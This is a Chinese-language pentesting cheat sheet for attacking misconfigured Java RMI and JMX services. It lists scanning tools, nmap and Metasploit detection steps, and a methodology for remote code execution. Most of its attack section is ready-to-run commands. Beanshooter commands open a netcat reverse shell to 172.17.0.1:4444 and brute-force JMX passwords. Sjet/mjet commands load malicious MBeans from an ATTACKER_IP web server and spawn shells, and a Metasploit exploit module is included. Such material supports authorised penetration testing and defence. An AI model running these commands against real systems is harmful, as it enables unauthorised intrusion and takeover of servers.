# Java RMI

> Java RMI（远程方法调用）是一种Java API，它允许在一台Java虚拟机（JVM）中运行的对象调用另一台JVM（即使它们位于不同的物理机器上）上的对象的方法。RMI 提供了一种用于基于Java的分布式计算的机制。

## 概述

* [工具](#工具)
* [检测](#检测)
* [方法论](#方法论)
    * [使用 beanshooter 进行 RCE](#使用-beanshooter-进行-rce)
    * [使用 sjet/mjet 进行 RCE](#使用-sjet-or-mjet-进行-rce)
    * [使用 Metasploit 进行 RCE](#使用-metasploit-进行-rce)
* [参考文献](#参考文献)

## 工具

* [siberas/sjet](https://github.com/siberas/sjet) - Siberas JMX 攻击工具包
* [mogwailabs/mjet](https://github.com/mogwailabs/mjet) - Mogwai 实验室 JMX 攻击工具包
* [qtc-de/remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) - Java RMI 漏洞扫描器
* [qtc-de/beanshooter](https://github.com/qtc-de/beanshooter) - JMX 枚举和攻击工具。

## 检测

* 使用 [nmap](https://nmap.org/)：

  ```powershell
  $ nmap -sV --script "rmi-dumpregistry or rmi-vuln-classloader" -p TARGET_PORT TARGET_IP -Pn -v
  1089/tcp open  java-rmi Java RMI
  | rmi-vuln-classloader:
  |   脆弱性：
  |   RMI 注册表默认配置远程代码执行漏洞
  |     状态：脆弱
  |       默认配置的 RMI 注册表允许从远程 URL 加载类，这可能导致远程代码执行。
  | rmi-dumpregistry:
  |   jmxrmi
  |     javax.management.remote.rmi.RMIServerImpl_Stub
  ```

* 使用 [qtc-de/remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)：

  ```bash
  $ rmg scan 172.17.0.2 --ports 0-65535
  [+] 在 172.17.0.2 的 6225 个端口上扫描 RMI 服务。
  [+]  [命中] 在 172.17.0.2:40393 (DGC) 上发现 RMI 服务。
  [+]  [命中] 在 172.17.0.2:1090 (注册表, DGC) 上发现 RMI 服务。
  [+]  [命中] 在 172.17.0.2:9010 (注册表, 激活器, DGC) 上发现 RMI 服务。
  [+]  [6234 / 6234] [#############################] 100%
  [+] 端口扫描完成。

  $ rmg enum 172.17.0.2 9010
  [+] RMI 注册表绑定名称：
  [+]
  [+]  - plain-server2
  [+]   --> de.qtc.rmg.server.interfaces.IPlainServer (未知类)
  [+]       终点: iinsecure.dev:39153 ObjID: [-af587e6:17d6f7bb318:-7ff7, 9040809218460289711]
  [+]  - legacy-service
  [+]   --> de.qtc.rmg.server.legacy.LegacyServiceImpl_Stub (未知类)
  [+]       终点: iinsecure.dev:39153 ObjID: [-af587e6:17d6f7bb318:-7ffc, 4854919471498518309]
  [+]  - plain-server
  [+]   --> de.qtc.rmg.server.interfaces.IPlainServer (未知类)
  [+]       终点: iinsecure.dev:39153 ObjID: [-af587e6:17d6f7bb318:-7ff8, 6721714394791464813]
  [...]
  ```

* 使用 [rapid7/metasploit-framework](https://github.com/rapid7/metasploit-framework)

  ```bash
  use auxiliary/scanner/misc/java_rmi_server
  set RHOSTS <IPs>
  set RPORT <PORT>
  run
  ```

## 方法论

如果一个 Java 远程方法调用（RMI）服务配置不当，就会变得容易受到各种远程代码执行（RCE）方法的攻击。一种方法是托管一个 MLet 文件，并引导 JMX 服务从远程服务器加载 MBeans，这可以通过 mjet 或 sjet 等工具实现。remote-method-guesser 是一个较新的工具，它结合了 RMI 服务枚举与已知攻击策略的概述。

### 使用 beanshooter 进行 RCE

* 列出可用属性：`beanshooter info 172.17.0.2 9010`
* 显示属性值：`beanshooter attr 172.17.0.2 9010 java.lang:type=Memory Verbose`
* 设置属性值：`beanshooter attr 172.17.0.2 9010 java.lang:type=Memory Verbose true --type boolean`
* 暴力破解受密码保护的 JMX 服务：`beanshooter brute 172.17.0.2 1090`
* 列出注册的 MBeans：`beanshooter list 172.17.0.2 9010`
* 部署一个 MBean：`beanshooter deploy 172.17.0.2 9010 non.existing.example.ExampleBean qtc.test:type=Example --jar-file exampleBean.jar --stager-url http://172.17.0.1:8000`
* 枚举 JMX 端点：`beanshooter enum 172.17.0.2 1090`
* 调用 JMX 端点上的方法：`beanshooter invoke 172.17.0.2 1090 com.sun.management:type=DiagnosticCommand --signature 'vmVersion()'`
* 调用任意公共和静态 Java 方法：

    ```ps1
    beanshooter model 172.17.0.2 9010 de.qtc.beanshooter:version=1 java.io.File 'new java.io.File("/")'
    beanshooter invoke 172.17.0.2 9010 de.qtc.beanshooter:version=1 --signature 'list()'
    ```

* 标准 MBean 执行：`beanshooter standard 172.17.0.2 9010 exec 'nc 172.17.0.1 4444 -e ash'`
* 对 JMX 端点进行反序列化攻击：`beanshooter serial 172.17.0.2 1090 CommonsCollections6 "nc 172.17.0.1 4444 -e ash" --username admin --password admin`

### 使用 sjet 或 mjet 进行 RCE

#### 要求

* Jython
* JMX 服务器可以连接到由攻击者控制的 HTTP 服务
* JMX 身份验证未启用

#### 远程命令执行

攻击涉及以下步骤：

* 启动一个 Web 服务器，托管 MLet 和恶意 MBeans 的 JAR 文件
* 使用 JMX 在目标服务器上创建 `javax.management.loading.MLet` 类的实例
* 调用 MBean 实例的 `getMBeansFromURL` 方法，传入 Web 服务器的 URL 作为参数。JMX 服务将连接到 HTTP 服务器并解析 MLet 文件。
* JMX 服务下载并加载 MLet 文件中引用的 JAR 文件，使恶意 MBean 可通过 JMX 访问。
* 攻击者最终调用恶意 MBean 中的方法。

利用 [siberas/sjet](https://github.com/siberas/sjet) 或 [mogwailabs/mjet](https://github.com/mogwailabs/mjet) 攻击 JMX：

```powershell
jython sjet.py TARGET_IP TARGET_PORT super_secret install http://ATTACKER_IP:8000 8000
jython sjet.py TARGET_IP TARGET_PORT super_secret command "ls -la"
jython sjet.py TARGET_IP TARGET_PORT super_secret shell
jython sjet.py TARGET_IP TARGET_PORT super_secret password this-is-the-new-password
jython sjet.py TARGET_IP TARGET_PORT super_secret uninstall
jython mjet.py --jmxrole admin --jmxpassword adminpassword TARGET_IP TARGET_PORT deserialize CommonsCollections6 "touch /tmp/xxx"

jython mjet.py TARGET_IP TARGET_PORT install super_secret http://ATTACKER_IP:8000 8000
jython mjet.py TARGET_IP TARGET_PORT command super_secret "whoami"
jython mjet.py TARGET_IP TARGET_PORT command super_secret shell
```

### 使用 Metasploit 进行 RCE

```bash
use exploit/multi/misc/java_rmi_server
set RHOSTS <IPs>
set RPORT <PORT>
# 如果需要，也可以配置 payload
run
```

## 参考文献

* [攻击基于 RMI 的 JMX 服务 - Hans-Martin Münch - 2019 年 4 月 28 日](https://mogwailabs.de/en/blog/2019/04/attacking-rmi-based-jmx-services/)
* [JMX RMI - 多应用程序 RCE - Red Timmy Security - 2019 年 3 月 26 日](https://www.exploit-db.com/docs/english/46607-jmx-rmi-–-multiple-applications-remote-code-execution.pdf)
* [remote-method-guesser - BHUSA 2021 Arsenal - Tobias Neitzel - 2021 年 8 月 15 日](https://www.slideshare.net/TobiasNeitzel/remotemethodguesser-bhusa2021-arsenal)